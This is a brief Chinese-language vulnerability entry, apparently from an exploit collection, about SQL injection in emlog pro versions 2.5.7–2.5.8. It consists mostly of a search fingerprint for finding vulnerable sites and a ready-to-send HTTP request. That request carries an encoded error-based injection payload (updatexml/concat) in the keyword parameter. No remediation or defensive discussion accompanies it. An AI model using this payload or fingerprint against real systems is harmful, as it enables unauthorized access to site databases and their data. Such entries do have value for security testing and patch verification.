# emlogpro-2.5.7-2.5.8存在SQL注入漏洞

emlogpro-2.5.7-2.5.8 ｜ SQL注入 ｜ —
- **指纹**：`app="EMLOG"`
- **请求**：`GET /index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,version(),0x7e),1)%20%20--%2520 HTTP/1.1`
- **响应特征**：200